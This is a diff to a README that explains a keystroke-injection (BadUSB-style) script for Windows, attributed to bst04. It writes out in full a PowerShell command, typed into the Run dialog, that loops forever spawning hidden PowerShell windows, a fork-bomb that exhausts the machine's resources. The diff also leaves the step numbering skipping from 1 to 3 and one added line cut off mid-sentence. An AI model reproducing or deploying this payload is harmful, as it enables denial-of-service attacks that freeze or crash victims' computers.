@@ -9,14 +9,15 @@ This script, created by bst04, is designed to work on Windows devices. It opens 
 ## Technical Explanation
 
 1. **Initialization**:
+    - `DELAY 1500`: Waits for 1.5 seconds to ensure.
     - `GUI r`: Simulates pressing "Windows" + "R" to open the Run dialog.
     - `DELAY 250`: Waits for 0.25 seconds to ensure the Run dialog is open.
 
-2. **Execute PowerShell Command**:
+3. **Execute PowerShell Command**:
     - `STRING powershell -WindowStyle Hidden -Command "while ($true) { Start-Process powershell -ArgumentList '-NoExit', '-Command', 'Start-Process powershell -WindowStyle Hidden -ArgumentList \"-NoExit\", \"-Command\", \"Start-Process powershell -WindowStyle Hidden\"' }"`: Types a PowerShell command that runs an infinite loop, continuously opening hidden PowerShell windows.
     - `DELAY 1000`: Waits for 1 second to ensure the command is fully typed.
 
-3. **Start the Command**:
+4. **Start the Command**:
     - `ENTER`: Executes the PowerShell command.
 
 ---
